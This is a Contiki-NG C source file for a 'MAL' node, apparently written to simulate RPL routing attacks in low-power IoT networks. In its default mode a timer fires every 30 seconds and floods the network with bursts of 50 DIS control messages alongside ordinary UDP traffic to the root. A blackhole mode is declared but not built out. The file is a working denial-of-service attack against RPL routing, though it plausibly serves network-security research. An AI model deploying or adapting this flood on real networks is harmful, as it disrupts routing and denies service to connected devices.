#include "contiki.h"
#include "net/routing/routing.h"
#include "net/routing/rpl-lite/rpl.h"

#include "random.h"
#include "net/netstack.h"
#include "net/ipv6/simple-udp.h"

#include "sys/log.h"

#define LOG_MODULE "MAL"
#define LOG_LEVEL LOG_LEVEL_INFO

#define WITH_SERVER_REPLY  1
#define UDP_CLIENT_PORT	8765
#define UDP_SERVER_PORT	5678

#define SEND_INTERVAL		  (60 * CLOCK_SECOND)

static struct simple_udp_connection udp_conn;
#if MAL_BLACKHOLE==0
static void rpl_attack();
 static struct ctimer attack_time;
 uint16_t numbers=0;
#elif MAL_BLACKHOLE ==1
struct etimer time_sniff;
#endif
//  static struct etimer mytime;

/*---------------------------------------------------------------------------*/
PROCESS(udp_client_process, "MAL node");
AUTOSTART_PROCESSES(&udp_client_process);
/*---------------------------------------------------------------------------*/
static void
udp_rx_callback(struct simple_udp_connection *c,
         const uip_ipaddr_t *sender_addr,
         uint16_t sender_port,
         const uip_ipaddr_t *receiver_addr,
         uint16_t receiver_port,
         const uint8_t *data,
         uint16_t datalen)
{

  LOG_INFO("Received response '%.*s' from ", datalen, (char *) data);
  LOG_INFO_6ADDR(sender_addr);
#if LLSEC802154_CONF_ENABLED
  LOG_INFO_(" LLSEC LV:%d", uipbuf_get_attr(UIPBUF_ATTR_LLSEC_LEVEL));
#endif
  LOG_INFO_("\n");

}

#if MAL_BLACKHOLE==0 || MAL_DIS==1
static void rpl_attack(void *ptr){

  // if (!etimer_expired(&mytime)){
  //   ctimer_reset(&attack_time);
  //   return;
  // }
  LOG_INFO("Flood att:%d\n",numbers++);
      ctimer_reset(&attack_time);

  int i=0;
      //My code
      while (i<50){
        i++;
        rpl_icmp6_dis_output(NULL);
      }

  
  // ctimer_reset(&mytime);
}
#endif
/*---------------------------------------------------------------------------*/
PROCESS_THREAD(udp_client_process, ev, data)
{
  static struct etimer periodic_timer;
    // static struct stimer stimer_mine;

 
  static unsigned count;
  static char str[32];
  uip_ipaddr_t dest_ipaddr;

  PROCESS_BEGIN();

  //   stimer_set(&stimer_mine, 10);
  // while(stimer_expired(&stimer_mine)!=1)
  // {
  // // LOG_INFO("Waiting \n");
  // }

  /* Initialize UDP connection */
  simple_udp_register(&udp_conn, UDP_CLIENT_PORT, NULL,
                      UDP_SERVER_PORT, udp_rx_callback);

  etimer_set(&periodic_timer, random_rand() % SEND_INTERVAL);


  // ctimer_set(&mytime,60*CLOCK_SECOND,rpl_attack,NULL);
  #if MAL_BLACKHOLE==0
  LOG_INFO("prepare\n");
  ctimer_set(&attack_time,30*CLOCK_SECOND,rpl_attack,NULL);
  #elif MAL_BLACKHOLE==1
    etimer_set(&time_sniff, (120*CLOCK_SECOND));
#endif



  while(1) {
    
    PROCESS_WAIT_EVENT_UNTIL(etimer_expired(&periodic_timer));
    
    if(NETSTACK_ROUTING.node_is_reachable() && NETSTACK_ROUTING.get_root_ipaddr(&dest_ipaddr)) {
      /* Send to DAG root */
      LOG_INFO("Sending request %u to ", count);
      LOG_INFO_6ADDR(&dest_ipaddr);
      LOG_INFO_("\n");
      snprintf(str, sizeof(str), "hello %d", count);
      simple_udp_sendto(&udp_conn, str, strlen(str), &dest_ipaddr);
      count++;
    } else {
      LOG_INFO("Not reachable yet\n");
    }

    /* Add some jitter */
    etimer_set(&periodic_timer, SEND_INTERVAL
      - CLOCK_SECOND + (random_rand() % (2 * CLOCK_SECOND)));
  }

  PROCESS_END();
}
/*---------------------------------------------------------------------------*/
